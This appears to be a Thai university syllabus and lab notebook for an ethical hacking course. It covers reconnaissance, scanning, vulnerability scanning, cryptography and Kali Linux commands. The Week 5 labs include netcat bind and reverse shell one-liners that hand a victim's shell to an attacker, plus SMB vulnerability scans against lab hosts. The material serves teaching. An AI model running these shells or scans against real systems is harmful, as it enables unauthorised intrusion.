# NEIS1308/NETS2403: การเจาะระบบแบบมีจรรยาบรรณ (Ethical Hacking and Penetration Testing)

## รายละเอียดรายวิชา
ระบบเครือข่ายและระบบปฏิบัคิการในเชิงลึก เพื่อหาข้อบกพร่องหรือช่องโหว่ ขั้นตอนการทดลองเจาะระบบเทคนิคและเครื่องมือที่ใช้ในการเจาะระบบ การหาจุดบกพร่องของซอฟต์แวร์ การถอดรหัสลับ ไวรัส โทรจัน การดักจับข้อมูล การหาข้อมูลด้านความปลอดภัยจากอินเทอร์เน็ต การทดลองเจาะระบบเว็บไซต์ การตรวจสอบความปลอดภัยเครือข่ายไร้สาย กลไกในการป้องกันระบบจากการบุกรุก การสร้างเครื่องมือสำหรับผู้ทดสอบระบบ จริยธรรมและจรรยาบรรณสำหรับผู้ทดสอบเจาะระบบ การกู้คืนข้อมูล การหาข้อมูล การหาร่องรอยจากการบุกรุกทั้งภายในและภายนอก พ.ร.บ.ว่าด้วยการกระทำความผิดเกี่ยวกับคอมพิวเตอร์

---
ม.เทคโนโลยีมหานคร อาคาร Q ห้อง Q101 

คาบ SAT2: 1030 - 1300

คาบ SAT3: 1330 - 1600

--- 
## Course Syllabus
- Course Introduction
- Network Refresher
- Ethical Hacking Methodology
- Information Gathering
- Scanning & Enumeration
- Vulnerability Scan
- Cryptography
- Exploitation
- Exploit Development (Buffer Overflows) 
- Privilege Escalation
- Wireless attack
- Web Attack
- พ.ร.บ.ไซเบอร์ และ Cyberrsecurity Framework

---
## Week 1@26 Nov 2022
## Lec 

### Group Line Prepare and channel for communicate

### Ethical Hacking คืออะไร (Q&A ทีละคน)

### Cybersecurity LIVE attack
- [Cisco Talos intelligence](https://talosintelligence.com/ebc_spam)
- [Digital Attack Map](https://www.digitalattackmap.com/)
- [FireEye Cybermap](https://www.fireeye.com/cyber-map/threat-map.html)
- [Fortinet Threatmap](https://threatmap.fortiguard.com/)
- [Raadware livethreatmap](https://livethreatmap.radware.com/)
  
### What Happens in an Internet Minute in 2022
- [1 min happen](https://localiq.com/blog/what-happens-in-an-internet-minute/)

### Technical Skill 
- Operation System (Windows, Linux, MacOS, etc.)
- Network concept
- Protocol
- Command over security areas

### Non-Technical Skills
- Learning ability 
- Problem-Solving skills
- Communication skiills
- Coommmited to security policies 
- Awareness of law, standards and Regulations 
  
### Security Concepts 

### The CIA Triad

C - Confidentiality การรักษาไว้ซึ่งความลับของข้อมูล โดยเป็นการปกป้องข้อมูลและไม่เปิดเผยข้อมูลไปยังผู้ที่ไม่ได้รับอนุญาต 
    
    - Personally Identifiable Information (PII) อยู่ภายใต้ขอบเขตของ confidentiality ซึ่งกล่าวถึงข้อมูลของแต่ละบุคคลที่จะต้องมีการรักษาไว้ซึ่งความลับและไม่ถูกเปิดเผยให้กับผู้ที่ไม่ได้รับอนุญาต ยกตัวอย่างเช่น protected health information (PHI) เป็นการป้องกันข้อมูลทางการแพทย์ของผู้ป่วย จะต้องได้รับการปกป้องให้สามารถเข้าถึงได้เฉพาะบุคคลที่มีได้รับอนุญาตเข้าถึงข้อมูลดังกล่าว เป็นต้น 

I - Integrity ข้อมูลต้องมีความถูกต้องครบถ้วนสมบูรณ์ไม่มีการเปลี่ยนแปลง ดัดแปลง หรือแก้ไขใด ๆ โดยไม่ได้รับอนุญาต
    
    - Data integrity เป็นการบ่งบอกว่าข้อมูลดังกล่าวจะต้องไม่ถูกเปลี่ยนแปลงใดๆ จากผู้ที่ไม่มีสิทธิ โดยจะต้องมีการป้องกันข้อมูลภายในระบบ เพื่อให้สามารถมั่นใจได้ว่าข้อมูลต่าง ๆ จะไม่ถูกเปลี่ยนแปลงไปในขั้นตอน เช่น ระหว่างจัดเก็บข้อมูล, ระหว่างการประมวลผลข้อมูล และระหว่างการส่งต่อข้อมูลได้ 
    
    - System integrity เป็นรูปแบบการจัดทำ Baseline สำหรับระบบ เพื่อให้มั่นใจได้ว่าระบบมีการตั้งค่าไว้อย่างถูกต้องสมบูรณ์โดยที่ไม่ถูกเปลี่ยนแปลงหรือแก้ไขการตั้งค่าแต่อย่างใด 

A - Availability ข้อมูลต้องมีความพร้อมใช้งานเมื่อถูกเรียกใช้ กล่าวคือข้อมูลจะต้องสามารถเข้าถึงได้และสามารถใช้งานได้จากผู้ที่มีสิทธิการเข้าถึงข้อมูลดังกล่าวเมื่อมีการร้องขอ

### Risk 
  - ผลกระทบ (Impact) x แนวโน้มที่จะเกิดเหตุ (Likehood)
### Control
  - Physical Control - การควบคุมทางกายภาพ
  - Technique Control - การควบคุมด้วยเทคเนิค
  - Administrative Control - การควบคุมเชิงนโยบาย

## Lab 
- Setup environment
- Install [VMWare](https://www.vmware.com/latam/products/workstation-pro/workstation-pro-evaluation.html)/[VirtualBox](https://www.virtualbox.org/)
- Config netowrk for Hypervisor 
  - Host Only
  - NAT
  - NAT Network
  - Bridge Network
- Install [Kali linux](https://www.kali.org/)
--- 
## Week 2@3 Dec 2022
## Lec
### Penetration Testing Process
- Pre-Exploitation
  - Information Gathering
  - Scanning
  - Enumeration
- Exploitation
  - Remote Exploitation
    - Gain System Access
    - Gain Information
    - Denial of services
    - Privilege Escalation
  - Local Exploitation
    - Bypass Restriction
    - Privilege Escalation
- Post-Exploitation
  - Gathering Sensitive information
  - Manage System/Services
  - Pivoting

### Stages of Hacking Cycles 
- Reconnaissance
  - Passive Reconnaissance
  - Active Reconnaissance 
- Scanning 
- Gaining Access
- Maintain Access
- Clearing Tracks
- Network Refresher
  - Introduction
  - OSI Model
  - Layer 2
  - Layer 3
  - Layer 4
  - Wellknown Protocols
  - Subnetting
## Lab
- Exploring Kali Linux 
- Sudo Overview 
- Navigating the File System
- Users and Privileges
  ```bash
  useradd test1
  passwd test1
  ```
- Common Network Commands 
  ```bash
  #SSH Command 
  ssh root@<ipaddr>
  ssh -i <certificate> root@<ipaddr>
  # list 
  ls 
  ls -la 
  # Print working directory
  pwd 
  # Change Directory 
  cd /
  cd ..
  cd 
  # Create empty file
  touch file.txt
  touch file{1..10}
  # write file
  echo "Hello" > file.txt
  echo "world" >> file.txt
  # show file 
  cat file.txt
  # Create directory
  mkdir mydir
  # copy and move file 
  cp file1 /tmp/.
  mv file1 file2 
  # remove file 
  rm -r file.txt
  rm -rf file.txt
  # Create symbollink or shortcut
  ln -s file.txt linkfile
  #Clear Screen
  clear 
  # Check username 
  whoami
  # install/update/upgrade software (Kali linux)
  sudo apt install vim
  sudo apt update 
  sudo apt upgrade -y 
  # manual of software
  man cat
  # Compare the file
  diff file1 file1.xx
  # Find file
  sudo find / -name "file.txt"
  # Find hidden file
  sudo find / -type f -name "."
  # find empty directory
  find . -type f -empty
  # find excutable files
  find /  -perm /a=x 

  # Network Check
  ip link show
  ip a
  ip a | grep eth0
  ip address show dev <INTERFACE>
  ip route show
  ifconfig
  ifconfig -a 
  # Enable Interface
  ifconfig <INTERFACE> up 
  # Disable Interface 
  ifconfig <INTERFACE> down
  # Set static IP on Interface
  ifconfig <INTERFACE> <IPADDRESS> netmask <NETMASK> broadcast <BROADCAST>
  # Enable Promiscuous mode for sniff data
  ifconfig <INTERFACE> promisc

  # Route 
  route
  route -n 
  route add default gw 192.168.1.1
  route add -net <Network> netmask <Netmask> gw <Gateway>
  # List routing cache info
  route -Cn
  # Port Checking
  netstat -ant 

  # DNS Checking
  nslookup www.google.com

  # Ping Test 
  ping -c 3 google.com
  # Traceroute 
  traceroute 8.8.8.8
  # iPerf 
  sudo apt install iperf -y
  # Server Side
  iperf -s
  # Client Side
  iperf -c <SERVER IP>
  ```
- Viewing, Creating and Editing
  ```bash
  nano file1
  cat file1
  tail file1
  head file1
  less file1
  ```
- Install and Update tools
  ```bash
  sudo apt update
  sudo apt upgrade -y
  ```
- Envionmane Variables
  ```bash 
  echo $PATH
  echo $USER
  echo $PWD
  echo $HOME
  # Environment variable can be defined with the export command
  export b=8.8.8.8
  ping -c 2 $b
  # Other environment variables defined by default in Kali Linux
  env
  ```
- Basic History Tricks 
  ```bash
  history
  # Rather than re-typing a long command from our history, we can make use of the history expansion facility. For example, looking back at Listing 34, there are three commands in our history with a line number preceding each one. To re-run the first command, we simply type the ! character followed by the line number, in this case 1, to execute the cat /etc/lsb-release command
  !1
  
  # history shortcut is !!, which repeats the last command that was executed during our terminal session:
  !!
  # By default, the command history is saved to the .bash_history file in the user home directory. 
  cat ~/.bash_history
  ```
  - Redirecting to a new file
  ```bash
  ls 
  echo "test"
  echo "test" > redirection_test.txt
  ls 
  cat redirection_test.txt
  echo "Kali linux" > redirection_test.txt
  cat redirection_test.txt
  echo "IS FUN" >> redirection_test.txt
  cat redirection_test.txt
  # As you may have guessed, we can use the < operator to send data the “other way”. In the following example, we redirect the wc command’s STDIN with data originating directly from the file we generated in the previous section. Let’s try this with wc -m which counts characters in the file
  wc -m < redirection_test.txt
  # Redirecting STDERR
  ls .
  ls ./test
  ls ./test 2>error.txt
  cat error.txt
  ```
  - Pipe
  ```bash
  cat error.txt
  cat error.txt | wc -m
  cat error.txt | wc - m > count.txt
  cat count.txt
  ```
  - Grep
  ```bash
  ls -la /usr/bin | grep zip
  ```
  - sed 
  ```bash 
  echo "I need to try hard" | sed 's/hard/harder /'
  ```
  - cut 
  ```bash
  echo "I Hack binaries, web apps, mobile apps, and just about anythong else" | cut -f 2 -d ","

  cut -d ":" -f 1 /etc/passwd
  ``` 
  - awk 
  ```bash
  echo "hello::there::friend" | awk -F "::" '{print $1, $3}'
  ```
  - nano
  - vi/vim
  - Download File
  ```bash
  # The wget command, which we will use extensively, downloads files using the HTTP/HTTPS and FTP protocols. Listing 67 shows the use of wget along with the -O switch to save the destination file with a different name on the local machine
  wget -o filename https://test.com/file
  wget -P <PATH> https:/test.com/file.tar.xz
  # Limit speed wget
  wget --limit-rate=1m https:/test.com/file.tar.xz
  # Download by use another User-Agent
  wget --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0" https:/test.com/file.tar.xz
  # Nocheck Certificate 
  wget --no-check-certificate https://test.com
  # curl is a tool to transfer data to or from a server using a host of protocols including IMAP/S, POP3/S, SCP, SFTP, SMB/S, SMTP/S, TELNET, TFTP, and others. A penetration tester can use this to download or upload files and build complex requests. 
  curl -o filename https://test.com
  # Get Request
  curl --request GET https://test.com
  curl -X GET https://test.com
  # Post Request
  curl --request POST
  curl -X POST
  curl --request POST https://test.com  -d 'username=admin&password=P@ssw0rd'
  # Request spec header
  curl -H "X-Header: value" https://test.com
  curl -H "X-Forwarded-For: 127.0.0.1" https://test.com


  # axel is a download accelerator that transfers a file from a FTP or HTTP server through multiple connections. This tool has a vast array of features, but the most common is -n, which is used to specify the number of multiple connections to use. In the following example, we are also using the -a option for a more concise progress indicator and -o to specify a different file name for the downloaded file.
  axel -a -n 20 -o filename https://test.test.com
   ```
  - Alias
  ```bash 
  alias lsa='ls -la'
  lsa
  alias mkdir='ping -c 1 localhost'
  unalias mkdir
  mkdir
  ```
--- 
## Week 3@10 Dec 2022
หยุดรัฐธรรมนูญ โดยชดเชยวันอาทิตย์ที่ 15 ม.ค.65

--- 
## Week 4@17 Dec 2022
## Lec
- Ethical Hacking Methodology
- Information Gathering (Reconnaissance) 
- **Passive** information gathering
  - [WHOIS Analysis](https://who.is/)
  - DNS Enumeration 
    - Standard Record Enumeration (A, AAAA, NS, SOA, MX, TXT, etc.)
      - NS: Nameserver record, which indicates the name servers associated 
with a given domain.
      - A: Address IPv.4 Record
      - AAAA: Address IPv.6 record
      - MX: Mail Exchange record, which identifies the mail servers for the 
given domain.
      - TXT: Text record, which includes an arbitrary text string for the domain. 
      - HINFO: Host Information record, which associates an arbitrary set of 
information with a domain name, formerly used to indicate system types.
      - CNAME: Canonical Name record, which indicates aliases and alternative 
names for a given host 
      - SOA: Start of Authority record, which indicates that a server is authoritative for 
that DNS zone 
      - RP: Responsible Person records, which are informational, not functional (that is, 
they have no impact on DNS functionality) and indicate the human responsible 
for a given domain. 
      - PTR: Pointer for inverse lookups records, also called a reverse record, 
indicating an IP address to domain name mapping. 
      - SRV: Service location records, which provides information about available services, including port and hostname. 
    - Zone Transfer
    - Reverse lookup
    - Subdomain Brute-force
    - SSL Certificates 
    - Search engines 
    - Online DNS tools
    - dig tool
  ```bash
  dig {a|txt|ns|mx} domain.com
  dig {a|txt|ns|mx} domain.com @ns1.domain.com
  dig domain.com ANY
  # Zone Tranfer
  dig axfr example.com @ns1.example.com
  ```
    - dnsenum
  ```bash
  dnsenum --noreverse -o mydomain.xml example.com
  ```
    - dnsrecon tool
  ```bash
  dnsrecon -d target.com -D wordlist -t brt 
  dnsrecon -t snoop -D wordlist -n ns-server.com
  dnsrecon -d target.com -D wordlist -t std --xml dnsrecon.xml
  ```
    - amass tool
  ```bash
  amass enum -d domain.com
  amass itel -d domain.com
  ```
    - [shodan](https://www.shodan.io)
    - [Censys](https://search.censys.io/)
    - [Dnsdumpster](https://dnsdumpster.com/)
  

- **Active** information gathering
  - [nmap](https://www.stationx.net/nmap-cheat-sheet/)
  - masscan
  ```bash
  masscan -p80,8000-8100 10.0.0.0/8 --rate=10000
  masscan -p80 10.0.0.0/8 --banners -oB <filename>
  masscan --open --banners --readscan <filename> -oX <savefile>
  ```
  - enum4linux
  ```bash
  enum4linux -U -o <ip>
  enum4linux -a -v <ip>
  ```
  - smbclient: smbclient is a client that can ‘talk’ to an SMB/CIFS server. It 
offers an interface similar to that of the FTP program. Operations 
include things like getting files from the server to the local 
machine, putting files from the local machine to the server, 
retrieving directory information from the server and so on.
  ```bash
  smbclient -L <ip> 
  smbclient //<ip>/share
  ```
  - dirb
  ```bash
  dirb http://target.com/
  ```
  - gobuster
  ```bash
  gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php,.txt
  ```
  - Wfuzz
  ```bash
  wfuzz dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://target.com/~FUZZ
  ```
  - FFUF
  ```bash
  ffuf -c -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u 'http://target.com/FUZZ' -fc 403 
  ```
  - Metagofil ค้นหาไฟล์ต่างๆที่อยู่บนเว็บไซด์ของเป้าหมาย
  ```bash
  metagoofil -d target.com -t doc,pdf -l 200 -n 50 -o test -f
  # Option ที่ใช้คือ
  # -d ระบุเว็บไซด์ที่ต้องการค้นหา
  # -t ระบุประเภทไฟล์ที่ต้องการค้นหา
  # -n ระบุจำนวนไฟล์สูงสุดที่ต้องการ download
  # -l ระบุจำกัดผลที่รับกลับมาจากการค้นหาด้วย Google(โดยปกติคือ 200)
  # -o ระบุ path ที่เก็บไฟล์ต่างๆจากการ download file
  # -f ระบุถึงการบันทึกผลการ search
  ```
- OSINT (Opensource Intelligence)
  - [Map of OSINT](https://osintframework.com) 
  - [Sherlock](https://github.com/sherlock-project/sherlock) 
  - [Yandex](https://yandex.com/images) ค้นหารูปภาพได้ดีกว่า Google 
  - [ค้นหาข้อมูลเบอร์โทร](https://www.truecaller.com) 
  - [ค้นหา Location](https://tool.geoimgr.com) 
  - [ตรวจอสอบ Hotspot](https://www.wigle.net)
  - [ตรวจสอบเส้นทางการบิน](https://www.flightradar24.com) 
  - [ตรวจสอบเส้นทางเดินเรือ](https://www.marinetraffic.com/en/ais/home/centerx:-12.0/centery:24.9/zoom:4) 
  - [Google Hacking Database](https://www.exploit-db.com/google-hacking-database) 
  - [SSL or TLS certificates](https://crt.sh) 
  - [Wayback Machine](https://archive.org/web/)
  - [Check Beach information](https://haveibeenpwned.com) และ (https://www.dehashed.com) 
  - [Spiderfoor](https://www.spiderfoot.net) SpiderFoot is a reconnaissance tool that automatically queries over 100 public data sources (OSINT) to gather intelligence on IP addresses, domain names, e-mail addresses, names and more. 
  - [Robtex](https://www.robtex.com/dashboard/)
  - [เว็บสำหรับตรวจสอบเว็บที่โดน Web Defacement](http://zone-h.org)
  - AI Face Generator (https://thispersondoesnotexist.com และ https://generated.photos/faces)
  - IOC Checker
    - https://otx.alienvault.com/preview
    - https://exchange.xforce.ibmcloud.com
    - https://www.virustotal.com 
    - https://www.hybrid-analysis.com 
  - Threat intelligent feed source 
    - https://www.circl.lu/doc/misp/feed-osint
    - http://www.botvrij.eu/data/feed-osint
    - https://zeustracker.abuse.ch/blocklist.php?download=compromised
    - http://rules.emergingthreats.net/blockrules/compromised-ips.txt
    - https://panwdbl.appspot.com/lists/mdl.txt
    - https://www.dan.me.uk/torlist
    - http://cybercrime-tracker.net/all.php
    - http://data.phishtank.com/data/online-valid.csv
    - http://labs.snort.org/feeds/ip-filter.blf
    - https://ransomwaretracker.abuse.ch/feeds/csv/
- [TOR Network](https://www.torproject.org)
  - Search engine in TOR 
    - https://ahmia.fi/ 
    - ahmia
    - darksearchio
    - onionland
    - notevil
    - darksearchenginer
    - phobos
    - onionsearchserver
    - torgle
    - onionsearchengine
    - tordex
    - tor66
    - tormax
    - haystack
    - multivac
    - evosearch
    - deeplink
  - กรณีต้องการเข้าใช้ .onion สามารถใช้ .ly ต่อท้าย เพื่อเข้าไปยัง Site ดังกล่าวได้โดยไม่ผ่าน Browser TOR ได้ เช่น .onion.ly เป็นต้น
  - Check TOR Exit Nodes 
    - https://www.dan.me.uk/tornodes 
    - https://udger.com/resources 
  - Mail on TOR 
    - http://mail2tor2zyjdctd.onion 
    - http://secmailw453j7piv.onion 
    - https://ctemplar.com 
  - BTC followup 
    - https://etherscan.io
    - https://www.bitcoinwhoswho.com
    - https://www.blockchain.com/explorer 
--- 

## Week 5@24 Dec 2022
## Lec & LAB
- [Download Windows 7](https://drive.google.com/file/d/1-5mODkxntoAZwID137bdZohXanrtBWnh/view?usp=sharing)
- Enumeration
  - Email ID
  - Default Password
  - SNMP
  - Bruteforce Attack on Active Directory
  - Enumeration through DNS Zone Transfer 
  - Services and Ports to Enumerate
  - Research Potential Vulnerability 
    - [Exploit DB](https://www.exploit-db.com/)
    - Searchspoit
     ```bash
      searchspoit smb
    ```
- Vulnerability Scanning
  - NMAP NSE script 
    ```bash
    ls -ls /usr/share/nmap/scripts 
    # Help NSE Script
    nmap --script=help dns-zone-transfer
    # DNS
    nmap --script=dns-zone-transfer -p 53 ns.server.test 
    # SMB
    ls -la /usr/share/nmap/scripts/smb*
    nmap 10.10.10.10 --script=smb-os-discovery
    # In this case, Nmap identifies that the specific SMB service is missing at least one critical patch for the MS08-067212 vulnerability.
    nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.10.10.10
    ```
  - Connection Testing 
    - Binding Shell 
      ```bash 
      # Attacker(10.10.10.1) ---> Victim (10.10.10.2)
      ## Attacker command (KALI Linux) 
      nc 10.10.10.2 4444 

      ## Victim (Windows OS)
      nc.exe -vnlp 4444 -e cmd.exe 
      ## Victim (Unix OS)
      nc -vnlp 4444 -e /bin/bash
      ```
    - Reverse Shell
       ```bash 
      # Attacker(10.10.10.1) <--- Victim (10.10.10.2)
      ## Attacker command (KALI Linux) 
      nc -lvnp 4444

      ## Victim (Windows OS)
      nc.exe 10.10.10.1 4444 -e cmd.exe 
      ## Victim (Unix OS)
      nc 10.10.10.1 -e /bin/bash
      ```
    - Upload file by Netcat 
      ```bash 
      # Attacker(10.10.10.1) ---> Victim (10.10.10.2)
      ## Attacker command (KALI Linux) 
      nc 10.10.10.2 4444 < file.txt

      ## Victim (Windows OS)
      nc.exe –vnlp 4444 > file.txt
      ## Victim (Unix OS)
      nc –vnlp 4444 > file.txt
      ```
    - Download File by Netcat
      ```bash
      # Attacker(10.10.10.1) ---> Victim (10.10.10.2)
      ## Attacker command (KALI Linux) 
      nc 10.10.10.2 4444 > file.txt

      ## Victim (Windows OS)
      nc.exe –vnlp 4444 < file.txt
      ## Victim (Unix OS)
      nc –vnlp 4444 < file.txt
      ```
    - Python HTTP Server
      ```python
      python -m SimpleHTTPServer [port]      #Version 2
      python3 -m http.server   [port]        #Version 3 
      ```
    - [Shell Generator](https://www.revshells.com/)
    - Try DVWA SQLinjection and reverse shell to kali
      - [LAB Guide](https://drive.google.com/file/d/1-TMcU-b5_PyxAYoojZr876ByjT1yQVnm/view?usp=share_link)
      - [Metasploitable](https://drive.google.com/file/d/1-4Are7QBCnwRZ9_b3g3ncKNAWTAh2jun/view?usp=sharing)

--- 
## Week 6@31 Dec 2022

หยุดวันสิ้นปีใหม่ โดยชดเชยวันอาทิตย์ที่ 22 ม.ค.65

--- 
## Week 7@7 Jan 2023
Social Engineering Attacks 
- [setoolkit](https://linuxhint.com/kali-linux-set/)
Enumeration Cheatsheet 
- [Hacktricks](https://book.hacktricks.xyz/welcome/readme)
- Nessus
  - Install Guide 
    - Step 1: Download Nessus .deb file form [Tenable site](https://www.tenable.com/downloads/nessus).
    - Step 2: Install packet via apt command 
      ```bash
      sudo apt install ./Nessus-x.x.x.deb 
      ```
    - Step 3: Start nessusd service
      ```bash
      sudo systemctl start nessusd
      ```
    - Step 4: Navigate to [https://localhost:8834](https://localhost:8834)
    - Step 5: Install Nessus **Essential** Version
    - Step 6: Register and get Activate Code 
      - [Email Temp](https://tempail.com/en/)
      - [Activate Code](https://www.tenable.com/products/nessus/activation-code)
      - Step 7: Wait for download component 
      - Step 8: Let's Scan via New Scan
- [https://explainshell.com/](https://explainshell.com/)
- นักศึกษากลุ่มที่ 1 รายงานผลการ Pentest พร้อมอธิบาย Command อย่างละเอียด กลุ่มอื่น ๆ ทำตามและส่ง Flag 
  
--- 
## Week 8@14 Jan 2023
# Lec
- OpenVA
  - Install Guide 
    - Step 1: POSTGRESQL. Start the service for the gvm module (Greenbone Vulnerability Management)
    ```bash
    sudo /etc/init.d/postgresql start
    ```
    - Step 2: INSTALLATION OF GVM.
    ```bash
    sudo apt install --install-recommends gvm -y
    sudo gvm-check-setup
    ```
    - Step 3: Start service
    ```bash
    sudo systemctl start redis-server@openvas.service
    sudo systemctl enable redis-server@openvas.service
    ```
    - Step 4: add a "kali" user and his password: (by default but both need to be changed)
    ```bash
    sudo runuser -u _gvm -- gvmd --create-user=kali --password=kali
    ```
    - Step 5: Navigate to [https://127.0.0.1:9392/login](https://127.0.0.1:9392/login
- TRY to SCAN Win7 via Nessus and OpenVA

- นักศึกษากลุ่มที่ 2 รายงานผลการ Pentest พร้อมอธิบาย Command อย่างละเอียด กลุ่มอื่น ๆ ทำตามและส่ง Flag 

--- 
## Week 8@15 Jan 2023
## Lec
- Cryptography เป็นเทคโนโลยีการเข้ารหัสและถอดรหัสข้อมูลเพื่อป้องกันการถูกโจมตีหรือเข้าถึงโดยไม่มีสิทธิ์ มักใช้ในการเข้ารหัสข้อมูลส่วนตัว, ข้อมูลทางธุรกิจ และการสื่อสารในเครือข่าย
  - กระบวนการเข้ารหัสหรือ Encryption Process
    - Paintext > Encryption > Ciphertext > Decryption > Paintext 
  - Tools 
    - [Cyberchef](https://gchq.github.io/CyberChef/)
    - [dcode.fr](https://www.dcode.fr/)
  - Encoding and Decoding 
    - Encoding คือการแปลงข้อมูลให้อยู่ในรูปแบบที่ใช้ได้ในระบบหรือเครื่องมือที่เฉพาะ เช่น แปลงข้อมูลตัวอักษรให้เป็นเลขฐาน 2 (binary) หรือ แปลงข้อมูลภาพให้เป็นไฟล์ JPEG
    - Decoding คือการแปลงข้อมูลกลับมาในรูปแบบต้นฉบับ หรือรูปแบบที่ใช้ได้ในการเข้าถึง เช่น แปลงเลขฐาน 2 เป็นตัวอักษร หรือ แปลงไฟล์ JPEG เป็นภาพ
    - Binary เป็นรูปแบบการแปลงข้อมูลในรูปแบบต้นฉบับเป็นข้อมูลในรูปแบบฐาน 2 (binary) ซึ่งเป็นรูปแบบข้อมูลที่ใช้ในคอมพิวเตอร์ โดยใช้ 0 และ 1 เพื่อแทนค่าต่างๆ เช่น ตัวอักษร A จะแปลงเป็น 01000001 , ตัวเลข 10 เป็น 00001010
    - Base-8, หรือ Octal, เป็นระบบการเข้ารหัสตัวเลขที่ใช้ 8 หลัก ซึ่งมีตัวเลข 0-7 เป็นตัวหลัก โดยเลขใดเลขหนึ่งจะแทนค่า 8^n เมื่อ n เป็นตำแหน่งของหลัก ซึ่งจะแปลงข้อมูลเป็นตัวเลข 8 หลัก
    - Hex/Hexadecimal Hex encoding (Hexadecimal encoding) คือการแปลงข้อมูลในรูปแบบต้นฉบับเป็นข้อมูลในรูปแบบฐาน 16 (Hexadecimal) ซึ่งเป็นรูปแบบข้อมูลที่ใช้ในคอมพิวเตอร์ โดยใช้ตัวเลข 0-9 และ A-F เพื่อแทนค่าต่าง ๆ เช่น ตัวอักษร A จะแปลงเป็น 41 , ตัวเลข 10 เป็น A
    - Base58 Base58 เป็นระบบการเข้ารหัสตัวเลข ซึ่งจะแปลงข้อมูลเป็นตัวเลข 58 หลัก โดยใช้ตัวเลขจาก 0-9 และตัวอักษร A-Z และ a-z (ยกเว้นตัว l, I, O เพื่อไม่ให้เกิดความสับสน) ซึ่งมักใช้ในการเข้ารหัสข้อมูลส่วนตัว เช่น Bitcoin Address
    - Base62 เป็นระบบการเข้ารหัสตัวเลข ซึ่งจะแปลงข้อมูลเป็นตัวเลข 62 หลัก โดยใช้ตัวเลข 0-9 และตัวอักษร A-Z และ a-z ซึ่งจะเป็นรูปแบบข้อมูลที่มีขนาดเล็กกว่า Base64
    - Base64 เป็นระบบการเข้ารหัสข้อมูลโดยใช้ 64 ตัวอักษร โดยจะใช้เลข 0-9 และตัวอักษร A-Z, a-z และ + / (ยกเว้น = ) ซึ่งจะแปลงข้อมูลเป็นตัวเลข 6 หลัก
    - Base85 A binary-to-text encoding by using five ASCII characters to represent four bytes of binary data
    - ROT13 A simple letter substitution cipher that replaces a letterwith the 13th letter after it. ROT13 is a special case of the Caesar cipher that developed in ancient Rome
    - ROT47 A shift cipher that improves the Rot13 by allowing it to encode almost all visible ASCII characters (where Rot13 could only encode letters)
    - Atbash A monoalphabetic substitution cipher originally used to encrypt the Hebrew alphabet, which mapping the first letter becomes the last letter
    - URL Encode/Decode The converted and reversed URI/URL percent-encoded characters, a format supported by URIs/URLs
    - Morse Code A method that encode text characters as standardized sequences of two different signal durations, called dots and dashes or dits and dahs
    - Braille A rectangular block called cells that have tiny bumps with the raise of six-dot symbols for visually impaired
    - [Brainfuck](https://www.dcode.fr/langage-brainfuck)
    - [Affine Cipher](https://www.dcode.fr/affine-cipher)
    - [Malbolge](http://malbolge.doleczek.pl/)

## Lab
- นักศึกษากลุ่มที่ 3 รายงานผลการ Pentest พร้อมอธิบาย Command อย่างละเอียด กลุ่มอื่น ๆ ทำตามและส่ง Flag 
--- 

## Week 9@21 Jan 2023
## Lec
- Symmetric Key Cryptography
    - Process
      - Paintext + KEY > Ciphertext 
      - Ciphertext + KEY = Paintext
    - RC2 A symmetric-key block cipher designed by Ron Rivest. "RC" stands for "Ron's Code" or "Rivest Cipher"; other ciphers designed by Rivest include RC4, RC5, and RC6
    - RC4 A stream cipher that have the encryption by combining the plaintext using bit-wise exclusive-or and the decryption is performed the same way
    - XOR An encryption data by logical operation with the given key that outputs true only when inputs differ (one is true, the other is false)
    - Blowfish A symmetric-key block cipher included in many encryption products that provides a good encryption rate in software
    - Data Encryption Standard (DES) A symmetric-key algorithm for data encryption with a short key length of 56 bits (short 56-bit key size)
    - Advanced Encryption Standard (AES) A U.S. Federal Information Processing Standard (FIPS) algorithm with a block size of 128 bits, but three different key lengths: 128, 192 and 256 bits

- OpenSSL Toolkit
  ```bash
  # BASE64 Encode and Decode via OpenSSL
  echo 'Cryptography' | openssl enc -base64
  echo 'Cryptography' | openssl enc -e -base64
  echo 'Q3J5cHRvZ3JhcGh5Cg==' | openssl enc -d -base64

  # DES Encrypt/Decrypt
  # DES Ex 1 
  echo 'Cryptography' | openssl enc -des -base64 -K e0e0e0e0f1f1f1f1 -iv e0e0e0e0abababab
  echo 'NYC/82QHAy44n5n3ti9WBA==' | openssl enc -d -des -base64 -K e0e0e0e0f1f1f1f1 -iv e0e0e0e0abababab
  
  # DES Ex 2
  echo 'Cryptography' | openssl enc -des -base64 -k 'testdata'
  echo 'U2FsdGVkX1+lv7qNt+e+McLc0iNsKwfNWwc1A+LzSoo=' | openssl enc -d -des -base64 -k 'testdata'

  # DES Ex 3 
  echo 'Cryptography' | openssl enc -des -base64 -k 'testdata' -nosalt
  echo 'TnIGcH/Cob11I37QAe6RAQ==' | openssl enc -d -des -base64 -k 'testdata' -nosalt

  # DES Ex 4
  echo 'Cryptography' | openssl enc -des -base64 -k 'testdata' -pbkdf2
  echo 'U2FsdGVkX1/UOh4++KJcbhnQN/FYYiqbWQjQaBuSJNI=' | openssl enc -d -des -base64 -k 'testdata' -pbkdf2

  # AES-128 Encrypt/Decrypt
  echo 'Cryptography' | openssl enc -aes128 -base64 -k 'testdata' -pbkdf2
  echo 'U2FsdGVkX1/8sGvTYMz/lK8XPLJ4lw3rLDTrmT2U/fI=' | openssl enc -d -aes128 -base64 -k 'testdata' -pbkdf2

  # Blowfish Encrypt/Decrypt
  echo 'Cryptography' | openssl enc -bf -base64 -k 'testdata' -pbkdf2
  echo 'U2FsdGVkX1+QEJWo8tFlPlmihsslP2HduPHTbLRMyYo=' | openssl enc -d -bf -base64 -k 'testdata' -pbkdf2

  # RC4 Encrypt/Decrypt
  echo 'Cryptography' | openssl enc -rc4 -base64 -k 'pass' -pbkdf2 -nosalt
  echo 'K2zGLxryS/cNaSuaXg==' | openssl enc -d -rc4 -base64 -k 'pass' -pbkdf2 -nosalt

  # CAST Encrypt/Decrypt
  echo 'Cryptography' | openssl enc -cast -base64 -k 'hello' -pbkdf2
  echo 'U2FsdGVkX1/6nzZM4IEoiSX0rZz0neI43r5lbb9rBs4=' | openssl enc -d -cast -base64 -k 'hello' -pbkdf2
  ```

